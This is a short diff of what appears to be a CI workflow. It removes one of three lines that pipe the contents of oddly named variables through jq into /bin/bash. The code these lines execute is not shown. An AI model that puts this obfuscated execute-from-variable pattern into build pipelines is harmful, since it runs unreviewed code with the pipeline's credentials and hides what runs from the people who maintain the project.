@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$jbroa865" | jq -r .yxk2 | /bin/bash
           printf '%s' "$eme874" | jq -r .gxkyl32522 | /bin/bash
-          echo $qpktp35942 | jq -r .bgkv57443 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
